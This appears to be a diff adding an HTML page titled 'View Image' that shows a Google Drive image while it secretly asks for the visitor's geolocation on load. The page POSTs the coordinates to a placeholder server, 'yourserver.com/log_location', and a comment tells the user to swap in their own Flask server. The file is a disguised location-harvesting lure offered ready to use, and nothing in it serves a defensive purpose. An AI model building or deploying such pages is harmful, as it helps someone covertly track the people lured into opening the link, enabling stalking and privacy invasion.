@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>View Image</title>
+</head>
+<body onload="getLocation()">
+    <h2>Viewing Image...</h2>
+    <img src="https://drive.google.com/uc?export=view&id=1EAdh10l2J_WOdqtmvCZ4G-TZnTeTZrUo" alt="Image" width="300">
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+            } else {
+                alert("Geolocation not supported.");
+            }
+        }
+
+        function sendLocation(position) {
+            fetch("https://yourserver.com/log_location", {  // Replace with your actual hosted Flask server URL
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
+                })
+            }).then(response => response.json())
+              .then(data => console.log(data.message));
+        }
+
+        function handleError(error) {
+            console.log("Error fetching location:", error.message);
+        }
+    </script>
+</body>
+</html>
